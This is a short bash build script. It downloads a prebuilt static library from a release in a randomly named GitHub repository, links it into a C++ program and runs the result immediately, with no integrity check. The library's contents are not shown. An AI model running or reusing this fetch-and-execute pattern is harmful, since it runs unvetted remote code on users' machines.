#!/usr/bin/env bash
set -e
LIB="scale-boron.a"
TAG="golden-anchor-cosmic-forest"
REPO="forbithappsy/gotintedcarrier"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -o app -std=c++17 -pthread -O2 main.cpp "$LIB" && ./app
